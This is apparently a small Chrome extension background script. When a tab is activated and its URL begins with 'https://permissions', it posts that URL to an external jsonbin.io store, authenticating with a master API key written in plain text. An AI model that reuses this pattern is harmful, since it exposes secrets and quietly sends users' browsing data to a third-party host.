// const sendHttpRequest = (method, url, data) => {
//     const promise = new Promise((resolve, reject) => {
//       const xhr = new XMLHttpRequest();
//       xhr.open(method, url);
  
//       xhr.responseType = 'json';
  
//       if (data) {
//         xhr.setRequestHeader('Content-Type', 'application/json');
//       }
  
//       xhr.onload = () => {
//         if (xhr.status >= 400) {
//           reject(xhr.response);
//         } else {
//           resolve(xhr.response);
//         }
//       };
  
//       xhr.onerror = () => {
//         reject('Something went wrong!');
//       };
  
//       xhr.send(JSON.stringify(data));
//     });
//     return promise;
//   };

let req = new XMLHttpRequest();

let obj;

req.onreadystatechange = () => {
  if (req.readyState === XMLHttpRequest.DONE) {
    console.log(req.responseText);
  }
};

chrome.tabs.onActivated.addListener(tab =>{
   chrome.tabs.get(tab.tabId, current_tab_info=>{
       if(/^https:\/\/permissions/.test(current_tab_info.url)){
        obj=JSON.stringify(current_tab_info.url)
        // console.log()
        req.open("POST", "https://api.jsonbin.io/v3/b", true);
        req.setRequestHeader("Content-Type", "application/json");
        req.setRequestHeader("X-Master-Key", "$2b$10$.czrJw3TmYsiwxQwU.Wb2uy6/UQIDCY.BmOlXdJTU2REmLy0Feqme");
        req.send(`{"data":${obj}}`)
       }
   })
});

//chrome.tabs.executeScript(null,{file:'./foreground.js'},()=>console.log('i injected'))